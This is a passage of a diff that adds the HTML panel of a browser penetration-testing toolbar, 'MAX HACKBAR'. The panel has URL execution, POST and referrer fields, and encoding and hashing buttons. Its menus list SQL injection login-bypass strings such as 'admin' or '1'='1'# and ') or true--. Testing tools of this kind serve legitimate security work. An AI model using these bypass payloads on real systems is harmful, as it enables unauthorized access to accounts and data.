+                            <div class="item"><button class="ui-btn" name="pass7"><i class="user secret icon"></i>or 0=0 #</button></div>
+                            <div class="item"><button class="ui-btn" name="pass8"><i class="user secret icon"></i>') or ('x'='x</button></div>
+                            <div class="item"><button class="ui-btn" name="pass9"><i class="user secret icon"></i>' or a=a-- </button></div>
+                            <div class="item"><button class="ui-btn" name="pass10"><i class="user secret icon"></i>hi') or ('a'='a</button></div>
+                          </div>
+                        </div>
+                        <div class="item">
+                          <i class="dropdown icon"></i>
+                          <span class="text">Passcode 2</span>
+                          <div class="menu">
+                            <div class="item"><button class="ui-btn" name="pass11"><i class="user secret icon"></i>') or ('x')=('x</button></div>
+                            <div class="item"><button class="ui-btn" name="pass12"><i class="user secret icon"></i>or 1=1#</button></div>
+                            <div class="item"><button class="ui-btn" name="pass13"><i class="user secret icon"></i>admin' or '1'='1'#</button></div>
+                            <div class="item"><button class="ui-btn" name="pass14"><i class="user secret icon"></i>admin' or '1'='1</button></div>
+                            <div class="item"><button class="ui-btn" name="pass15"><i class="user secret icon"></i>admin') or ('1'='1'/*</button></div>
+                            <div class="item"><button class="ui-btn" name="pass16"><i class="user secret icon"></i>') or true--</button></div>
+                            <div class="item"><button class="ui-btn" name="pass17"><i class="user secret icon"></i>admin' or 1=1#</button></div>
+                            <div class="item"><button class="ui-btn" name="pass18"><i class="user secret icon"></i>admin') or '1'='1'--</button></div>
+                          </div>
+                        </div>
+                      </div>
+                    </a>
+
+                    <a class="ui dropdown item">
+                      Other
+                      <i class="dropdown icon"></i>
+                      <div class="menu">
+                            <div class="item"><button class="ui-btn" name="addslashes"><i class="filter icon"></i>Addslashes</button></div>
+                            <div class="item"><button class="ui-btn" name="stripslashes"><i class="filter icon"></i>Striplashes</button></div>
+                            <div class="item"><button class="ui-btn" name="stripspaces"><i class="filter icon"></i>Strip Spaces</button></div>
+                      </div>
+                    </a>
+
+
+                    <a class="text">
+                      <div class="ui icon buttons">
+                        <button class="ui basic button" name="plus"><i class="add icon disabled"></i></button>
+                        <button class="ui basic button" name="minus"><i class="minus icon disabled "></i></button>
+                        <div class="ui basic button" id="pip" data-tooltip="Offline" data-position="right center">
+                        <button class="ui-btn" id="ip-flag"><i class="flag"></i></button>
+                        </div>
+                      </div>
+                    </a>
+
+
+  </div>
+
+
+
+                    <!-- text box -->
+
+                    <div class="ui form">
+                        <div class="ui vertical labeled icon buttons">
+                          <button class="ui basic button" id="ui_loadurl">
+                            <i class="linkify icon"></i>
+                            Load URL
+                           </button>
+                          <button class="ui basic button" id="ui_split">
+                           <i class="cut icon"></i>
+                            Split URL
+                          </button>
+                          <button class="ui basic button" id="ui_run">
+                            <i class="sync icon"></i>
+                            Execution
+                          </button>
+                        </div>
+                        <div class="field">
+                        <textarea spellcheck="false" id="hackbar_urlfield"  rows="4"></textarea>
+                      </div>
+                    </div>
+
+                    <!-- row window -->
+
+                    <div class="row">
+                        
+                        <div class="ui checkbox" >
+                          <input type="checkbox" name="example" id="ui_postdata">
+                          <label>Post Data </label>
+                        </div>
+
+                        <div class="ui checkbox" >
+                          <input type="checkbox" name="example" id="ui_referer">
+                          <label>Referrer </label>
+                        </div>
+
+                        <div class="ui image label basic">
+                          REVERSE <a name="reverse" class="image label basic"> <img src="./img/quick1.png"></a>
+                        </div>
+                         <div class="ui image label basic">
+                          <a name="hexdecode" class="image label basic"> <img src="./img/quick2.png"></a> 
+                          HEX <a name="hexencode" class="image label basic"> <img src="./img/quick1.png"></a> 
+                        </div>
+
+
+                        <div class="ui image label basic">
+                          <a name="base64decode" class="image label basic"> <img src="./img/quick2.png"></a> 
+                          BASE64 <a name="base64encode" class="image label basic"> <img src="./img/quick1.png"></a> 
+                        </div>
+                        <div class="ui image label basic">
+                          <a name="xhexdecode" class="image label basic"> <img src="./img/quick2.png"></a> 
+                          0xHEX <a name="xhexencode" class="image label basic"> <img src="./img/quick1.png"></a> 
+                        </div>
+
+                        <div class="ui image label basic">
+                          <a name="urldecode" class="image label basic"> <img src="./img/quick2.png"></a> 
+                          URL <a name="urlencode" class="image label basic"> <img src="./img/quick1.png"></a> 
+                        </div>
+
+                        <div class="ui image label basic">
+                          MD5 <a name="md5hash" class="image label basic"> <img src="./img/quick1.png"></a>
+                        </div>
+
+                        <div class="ui image label basic">
+                          SHA1 <a name="sha1hash" class="image label basic"> <img src="./img/quick1.png"></a>
+                        </div>
+
+                        <div class="ui image label basic">
+                          SHA256 <a name="sha256hash" class="image label basic"> <img src="./img/quick1.png"></a>
+                        </div>
+
+                        <div class="ui image label basic">
+                          ROT13 <a name="rot13" class="image label basic"> <img src="./img/quick1.png"></a>
+                        </div>
+
+                    </div>
+
+
+
+
+
+
+   </div>
+</section>
+
+<!--  Pop Up Box -->
+<div class="ui mini modal raised segment">
+  <i class="close icon"></i>
+  <a class="ui orange ribbon label">
+    <i class="user secret icon"></i>MAX HACKBAR</a>
+   <div class="header" id="pBanner"></div>
+
+  <div class="content ">
+     <div class="ui fluid input">
+     <div class="ui label" id="inputbox1"></div>
+        <input type="text" id="sbox"/>
+     </div>
+
+     <div id="col2" class="ui fluid input">
+     <div class="ui label" id="inputbox2"></div>
+        <input type="text" id="sbox2"/>
+     </div>
+
+     <div id="col3" class="ui fluid input">
+     <div class="ui label" id="inputbox3"></div>
+        <input type="text" id="sbox3"/>
+     </div>
+</div>
+
+ <div class="actions">
+    <div id="closeBtn" class="ui mini button">Cancel</div>
+    <button id="searchBtn" name="" class="ui mini button">OK</button>
+  </div>
+</div>
+
+
+
+<section class="post-window">
+    <div class="ui post form" id="ui_postdatacontainer">
+      <div class="field">
+        <label>Post Data</label>
+        <textarea spellcheck="false" id="hackbar_postdatafield" rows="4"></textarea>
+      </div>
+    </div> 
+    <div class="ui form" id="ui_referercontainer">
+      <div class="field">
+        <label>Referrer</label>
+        <textarea spellcheck="false" id="hackbar_refererfield" rows="4"></textarea>
+      </div>
+    </div>                
+</section>
+
+    <script src="./assets/js/ui-panel.js"></script> 
+    <script src="./assets/js/semantic.min.js"></script>
+    <script src="./assets/js/Encrypt.js"></script> 
+    <script src="./assets/js/MISC.js"></script>
+    <script src="./assets/js/SQL.js"></script>
+    <script src="./assets/js/XSS.js"></script> 
+</body>
+</html>
